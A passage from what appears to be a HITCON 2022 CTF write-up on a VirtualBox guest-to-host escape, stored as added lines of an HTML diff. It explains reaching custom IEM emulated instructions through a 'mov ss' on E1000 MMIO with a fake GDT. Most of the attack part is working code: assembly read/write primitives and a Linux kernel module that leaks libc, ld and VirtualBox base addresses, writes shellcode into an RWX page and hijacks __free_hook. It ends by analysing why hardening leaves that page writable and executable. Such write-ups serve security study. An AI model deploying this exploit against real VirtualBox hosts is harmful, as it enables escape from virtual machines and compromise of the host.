+    <span class="k">return</span> <span class="n">VINF_SUCCESS</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>By combining all findings so far, it looked like we could finally trigger the custom IEM instructions!
+If <code class="language-plaintext highlighter-rouge">mov ss, reg</code> was causing an MMIO access to the E1000 device at the offset of the EECD register, then it would cause the instruction to be emulated!
+We can then place our target instruction immediately after <code class="language-plaintext highlighter-rouge">mov ss, reg</code> and it will also be emulated!
+Some initial testing seemed to confirm this hypothesis, but it also seemed to immediately crash after the <code class="language-plaintext highlighter-rouge">mov ss, reg</code> instruction.
+<!-- Furthermore, 
+In some cases, loading from memory can cause a VM exit. For example, when reading from MMIO of a (virtual) device, VirtualBox has to handle the access by e.g. returning the correct value.   --></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">iemCImpl_LoadSReg</code> function handles actually loading and parsing the descriptor we’re moving into SS. As the value moved there seems to be actually checked for validity, we’ll need to provide a valid value. This can be done either by controlling the value we load from MMIO somehow and having it be valid for SS, or by setting up a valid entry in the Global Descriptor Table (GDT).<br />
+The value returned from reading the EECD register is <code class="language-plaintext highlighter-rouge">0x140</code>.
+We first tried to look for another register that would have similar properties (i.e. return <code class="language-plaintext highlighter-rouge">VINF_IOM_R3_MMIO_READ</code>) and also we could write to, but could not find anything.
+Hence, we decided to create a fake Global Descriptor Table Register which points at our own array of GDTs, where entry <code class="language-plaintext highlighter-rouge">0x140</code> was valid.</p>
+
+<p>GDTR structure:</p>
+
+<p><img src="/HITCON-2022/pwn/img/pseudo_descriptor.svg" alt="GDTR format" /></p>
+
+<p>Segment Selector structure:</p>
+
+<p><img src="/HITCON-2022/pwn/img/segment_selector.svg" alt="Segment Selector format" /></p>
+
+<p>The segment selector’s index is bit 3 through 15, so we shift our 0x140 right by 3 to get the index, which is 40. We then memcpy the old GDT entries to our own array and copy the one at the current SS index to index 40, which should do the trick.</p>
+
+<p>Now that we’ve been enlightened about all this, it is possible to finally reach the vulnerable instructions in IEM.</p>
+
+<h2 id="the-black-gate-opens">The Black Gate Opens</h2>
+
+<p>At last, we have arrived at exploitation.<br />
+The first action item is to upgrade our current primitives to arbitrary read and write. We have full control over the 64-bit index, achieving arbitrary read and write is just a matter of leaking the address of <code class="language-plaintext highlighter-rouge">Table</code>.<br />
+In order to get the address of <code class="language-plaintext highlighter-rouge">Table</code>, we simply leaked a pointer to a string in the VBoxVMM.so, calculate its load base and finally add the <code class="language-plaintext highlighter-rouge">Table</code> offset to it.</p>
+
+<p>While doing some debugging, we noticed there was a page mapped as RWX. To get RIP control, we leak <code class="language-plaintext highlighter-rouge">fgets</code> from the GOT and calculate the base of libc and ld (through <code class="language-plaintext highlighter-rouge">dl_find_dso</code> in libc’s GOT). We then simply write shellcode to the RWX page and overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code> in libc to eventually jump there and get code execution.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">.intel_syntax</span> <span class="nv">noprefix</span>
+
+<span class="c1">; rdi = idx, rsi = mmio, rdx = curr_gdtr, rcx = fake_gdtr</span>
+<span class="nf">.global</span> <span class="nv">read_table_asm</span>
+<span class="nl">read_table_asm:</span>
+    <span class="nf">push</span> <span class="nb">rbx</span>
+    <span class="nf">sgdt</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">]</span>
+    <span class="nf">lgdt</span> <span class="p">[</span><span class="nb">rcx</span><span class="p">]</span>
+    <span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rdi</span>
+    <span class="nf">mov</span> <span class="nb">ss</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsi</span><span class="p">]</span>
+    <span class="nf">.byte</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0x25</span>
+    <span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="mh">0x18</span>
+    <span class="nf">mov</span> <span class="nb">ss</span><span class="p">,</span> <span class="nb">rbx</span>
+    <span class="nf">lgdt</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">]</span>
+    <span class="nf">pop</span> <span class="nb">rbx</span>
+    <span class="nf">ret</span>
+
+<span class="c1">; rdi = idx, rsi = mmio, rdx = curr_gdtr, rcx = fake_gdtr, r8 = val</span>
+<span class="nf">.global</span> <span class="nv">write_table_asm</span>
+<span class="nl">write_table_asm:</span>
+    <span class="nf">push</span> <span class="nb">rbx</span>
+    <span class="nf">sgdt</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">]</span>
+    <span class="nf">lgdt</span> <span class="p">[</span><span class="nb">rcx</span><span class="p">]</span>
+    <span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rdi</span>
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">r8</span>
+    <span class="nf">mov</span> <span class="nb">ss</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsi</span><span class="p">]</span>
+    <span class="nf">.byte</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0x27</span>
+    <span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="mh">0x18</span>
+    <span class="nf">mov</span> <span class="nb">ss</span><span class="p">,</span> <span class="nb">rbx</span>
+    <span class="nf">lgdt</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">]</span>
+    <span class="nf">pop</span> <span class="nb">rbx</span>
+    <span class="nf">ret</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="c1">	/* Needed by all modules */</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="c1">	/* Needed for KERN_INFO */</span><span class="cp">
+</span>
+<span class="cp">#include</span> <span class="cpf">&lt;linux/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/delay.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#include</span> <span class="cpf">&lt;linux/vmalloc.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;asm/io.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;asm/msr.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;asm/desc.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdalign.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#include</span> <span class="cpf">"offsets.h"</span><span class="cp">
+</span>
+<span class="cp">#define KERN_WARN KERN_WARNING
+</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">gdtr</span> <span class="p">{</span>
+    <span class="kt">uint16_t</span> <span class="n">limit</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">base</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">,</span> <span class="n">aligned</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span> <span class="n">gdtr_t</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="kt">uint64_t</span> <span class="n">gdt_entry</span><span class="p">;</span>
+
+<span class="n">gdtr_t</span> <span class="n">fake_gdtr</span> <span class="o">=</span> <span class="p">{};</span>
+<span class="n">gdt_entry</span> <span class="n">fake_gdts</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+
+<span class="kt">uint64_t</span> <span class="n">mmio_addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">static</span> <span class="kt">uint64_t</span> <span class="n">table_addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">static</span> <span class="kt">uint64_t</span> <span class="n">libc_base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="k">extern</span> <span class="kt">uint64_t</span> <span class="nf">read_table_asm</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">mmio</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">curr_gdtr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">fake_gdtr</span><span class="p">);</span>
+<span class="k">extern</span> <span class="kt">uint64_t</span> <span class="nf">write_table_asm</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">mmio</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">curr_gdtr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">fake_gdtr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">);</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">always_inline</span><span class="p">))</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">uint64_t</span> <span class="nf">read_table</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="n">gdtr_t</span> <span class="n">curr_gdtr</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="kt">uint64_t</span> <span class="n">curr_gdtr_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">curr_gdtr</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">fake_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fake_gdtr</span><span class="p">;</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">read_table_asm</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">mmio_addr</span><span class="p">,</span> <span class="n">curr_gdtr_ptr</span><span class="p">,</span> <span class="n">fake_ptr</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">always_inline</span><span class="p">))</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">write_table</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">val</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">gdtr_t</span> <span class="n">curr_gdtr</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="kt">uint64_t</span> <span class="n">curr_gdtr_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">curr_gdtr</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">fake_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fake_gdtr</span><span class="p">;</span>
+    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">write_table_asm</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">mmio_addr</span><span class="p">,</span> <span class="n">curr_gdtr_ptr</span><span class="p">,</span> <span class="n">fake_ptr</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">always_inline</span><span class="p">))</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">uint64_t</span> <span class="nf">rel_read64</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offset</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="n">read_table</span><span class="p">(</span><span class="n">offset</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">always_inline</span><span class="p">))</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">rel_write64</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="n">write_table</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">offset</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">always_inline</span><span class="p">))</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">uint64_t</span> <span class="nf">addr_to_offset</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="n">table_addr</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">offset</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">always_inline</span><span class="p">))</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">uint64_t</span> <span class="nf">arb_read64</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">addr_to_offset</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">rel_read64</span><span class="p">(</span><span class="n">offset</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">always_inline</span><span class="p">))</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">arb_write64</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">addr_to_offset</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+    <span class="n">rel_write64</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">always_inline</span><span class="p">))</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">arb_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">num</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">buf_vals</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">((</span><span class="n">num</span><span class="o">+</span><span class="mi">7</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">arb_write64</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="n">buf_vals</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"Entering pwn (0x%llx)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pwn</span><span class="p">);</span>
+
+    <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">str_table_off</span> <span class="o">=</span> <span class="n">str_addr_binary_off</span> <span class="o">-</span> <span class="n">table_binary_off</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">e1000_phys</span> <span class="o">=</span> <span class="mh">0xf0000000</span><span class="p">;</span>
+
+    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">e1000_virt</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">ioremap</span><span class="p">(</span><span class="n">e1000_phys</span><span class="p">,</span> <span class="mi">4096</span><span class="p">));</span>
+    <span class="k">volatile</span> <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">eeprom_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">e1000_virt</span><span class="o">+</span><span class="mh">0x10</span><span class="p">);</span>
+
+    <span class="kt">uint32_t</span> <span class="n">init_val</span> <span class="o">=</span> <span class="o">*</span><span class="n">eeprom_addr</span><span class="p">;</span>
+    <span class="n">mmio_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">eeprom_addr</span><span class="p">;</span>
+
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"new ss val: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">init_val</span><span class="p">);</span>
+
+    <span class="n">gdtr_t</span> <span class="n">curr_gdtr</span> <span class="o">=</span> <span class="p">{};</span>
+
+    <span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span>
+        <span class="s">"sgdt %0"</span>
+        <span class="o">:</span> <span class="s">"=m"</span><span class="p">(</span><span class="n">curr_gdtr</span><span class="p">)</span> <span class="o">::</span> <span class="s">"memory"</span>
+    <span class="p">);</span>
+
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"curr gdtr: 0x%llx (0x%x)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">curr_gdtr</span><span class="p">.</span><span class="n">base</span><span class="p">,</span> <span class="n">curr_gdtr</span><span class="p">.</span><span class="n">limit</span><span class="p">);</span>
+
+    <span class="kt">size_t</span> <span class="n">curr_size</span> <span class="o">=</span> <span class="n">curr_gdtr</span><span class="p">.</span><span class="n">limit</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">fake_gdts</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fake_gdts</span><span class="p">));</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">fake_gdts</span><span class="p">,</span> <span class="n">curr_gdtr</span><span class="p">.</span><span class="n">base</span><span class="p">,</span> <span class="n">curr_size</span><span class="p">);</span>
+
+    <span class="kt">uint32_t</span> <span class="n">new_ss_idx</span> <span class="o">=</span> <span class="n">init_val</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
+
+    <span class="n">fake_gdtr</span><span class="p">.</span><span class="n">base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">fake_gdts</span><span class="p">;</span>
+    <span class="n">fake_gdtr</span><span class="p">.</span><span class="n">limit</span> <span class="o">=</span> <span class="p">(</span><span class="n">new_ss_idx</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">old_ss_idx</span> <span class="o">=</span> <span class="mh">0x18</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="n">fake_gdts</span><span class="p">[</span><span class="n">new_ss_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">fake_gdts</span><span class="p">[</span><span class="n">old_ss_idx</span><span class="p">];</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"fake gdtr: 0x%llx (0x%x)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fake_gdtr</span><span class="p">.</span><span class="n">base</span><span class="p">,</span> <span class="n">fake_gdtr</span><span class="p">.</span><span class="n">limit</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">fgets_addr</span> <span class="o">=</span> <span class="n">rel_read64</span><span class="p">(</span><span class="n">fgets_got_off</span> <span class="o">-</span> <span class="n">table_binary_off</span><span class="p">);</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">fgets_addr</span> <span class="o">-</span> <span class="n">fgets_libc_off</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">free_hook_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">freehook_libc_off</span><span class="p">;</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"fgets @ 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fgets_addr</span><span class="p">);</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"libc @ 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">);</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"free_hook @ 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">free_hook_addr</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">str_addr</span> <span class="o">=</span> <span class="n">rel_read64</span><span class="p">(</span><span class="n">str_table_off</span><span class="p">);</span>
+    <span class="kt">uint64_t</span> <span class="n">binary_addr</span> <span class="o">=</span> <span class="n">str_addr</span> <span class="o">-</span> <span class="n">str_binary_off</span><span class="p">;</span>
+    <span class="n">table_addr</span> <span class="o">=</span> <span class="n">binary_addr</span> <span class="o">+</span> <span class="n">table_binary_off</span><span class="p">;</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"str @ 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">str_addr</span><span class="p">);</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"binary @ 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">binary_addr</span><span class="p">);</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"table @ 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">table_addr</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">dl_find_dso_addr</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">dl_find_dso_got</span><span class="p">);</span>
+    <span class="kt">uint64_t</span> <span class="n">ld_base</span> <span class="o">=</span> <span class="n">dl_find_dso_addr</span> <span class="o">-</span> <span class="n">dl_find_dso_off</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">rwx_addr</span> <span class="o">=</span> <span class="n">rwx_offset</span> <span class="o">+</span> <span class="n">ld_base</span><span class="p">;</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"dl_find_dso_addr @ 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dl_find_dso_addr</span><span class="p">);</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"ld.so @ 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ld_base</span><span class="p">);</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"rwx @ 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">rwx_addr</span><span class="p">);</span>
+
+    <span class="n">arb_write</span><span class="p">(</span><span class="n">rwx_addr</span><span class="p">,</span> <span class="n">shellcode_pwn</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode_pwn</span><span class="p">));</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"wrote shellcode to rwx region!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">msleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+
+    <span class="n">arb_write64</span><span class="p">(</span><span class="n">free_hook_addr</span><span class="p">,</span> <span class="n">rwx_addr</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">init_module</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">pwn</span><span class="p">();</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">cleanup_module</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>…</p>
+
+<p>But why is there an RWX page at all? At a first glance, this only seemed to happen with the build used by the challenge authors. In what way does their build differ from our local testing builds, that it would map a page as RWX?<br />
+The difference is the <code class="language-plaintext highlighter-rouge">--disable-hardening</code> flag we used, to make running the VirtualBox binaries from a location different than <code class="language-plaintext highlighter-rouge">/opt/VirtualBox</code> possible. When this flag is not specified, VirtualBox will call <code class="language-plaintext highlighter-rouge">SUPR3HardenedMain</code> from <code class="language-plaintext highlighter-rouge">main</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> * This function will perform the integrity checks of the VirtualBox
+ * installation, open the support driver, open the root service (later),
+ * and load the DLL corresponding to \a pszProgName and execute its main
+ * function.
+</code></pre></div></div>
+
+<p>According to its description, the hardened <code class="language-plaintext highlighter-rouge">main</code> will do some integrity checks. Eventually, the code will call <code class="language-plaintext highlighter-rouge">supR3HardenedPosixInit</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DECLHIDDEN</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">supR3HardenedPosixInit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">RT_ELEMENTS</span><span class="p">(</span><span class="n">g_aHooks</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">PCSUPHARDENEDPOSIXHOOK</span> <span class="n">pHook</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">g_aHooks</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+        <span class="kt">int</span> <span class="n">rc</span> <span class="o">=</span> <span class="n">supR3HardenedMainPosixHookOne</span><span class="p">(</span><span class="n">pHook</span><span class="o">-&gt;</span><span class="n">pszSymbol</span><span class="p">,</span> <span class="n">pHook</span><span class="o">-&gt;</span><span class="n">pfnHook</span><span class="p">,</span> <span class="n">pHook</span><span class="o">-&gt;</span><span class="n">ppfnRealResume</span><span class="p">,</span> <span class="n">pHook</span><span class="o">-&gt;</span><span class="n">pfnResolve</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">RT_FAILURE</span><span class="p">(</span><span class="n">rc</span><span class="p">))</span>
+            <span class="n">supR3HardenedFatalMsg</span><span class="p">(</span><span class="s">"supR3HardenedPosixInit"</span><span class="p">,</span> <span class="n">kSupInitOp_Integrity</span><span class="p">,</span> <span class="n">rc</span><span class="p">,</span>
+                                  <span class="s">"Failed to hook the %s interface"</span><span class="p">,</span> <span class="n">pHook</span><span class="o">-&gt;</span><span class="n">pszSymbol</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The only function registered to be hooked in <code class="language-plaintext highlighter-rouge">g_aHooks</code> is <code class="language-plaintext highlighter-rouge">dlopen</code>. The hooking is implemented in <code class="language-plaintext highlighter-rouge">supR3HardenedMainPosixHookOne</code>, <code class="language-plaintext highlighter-rouge">dlopen</code> is patched to jump to a callback function instead. Subsequently, a page with RWX permissions is allocated for the hook’s trampoline. The permissions for this page are not restricted after everything is in place.</p>
+
+<p>This is a nice example of how a security feature, in this case restricting which libraries are allowed to be loaded, can result in being considerably more easy to exploit.</p>
+
+<h2 id="the-scouring-of-the-threads">The Scouring of the Threads</h2>
+
+<p>Before we noticed the RWX page, we went down a deep rabbit hole of how to gain shellcode execution in VirtualBox.
+Although we ended up not finishing this part during the CTF, it can be interesting, in case VirtualBox ever ends up fixing the hooked page.</p>
+
+<p>Since we had arbitrary read/write, it should have been relatively easy to get full code execution.
+However, unlike a normal pwn challenge, simply overwriting <code class="language-plaintext highlighter-rouge">__free_hook</code> with <code class="language-plaintext highlighter-rouge">system</code>, then causing <code class="language-plaintext highlighter-rouge">free("/bin/sh")</code> would not be so easy.
+It seemed very difficult if not straight up impossible to control the contents of any allocation.
+So while it would be easy to get RIP control (e.g. <code class="language-plaintext highlighter-rouge">__free_hook</code> or any GOT symbol), it would be hard to gain meaningful control, as none of the other registers would likely have any control.
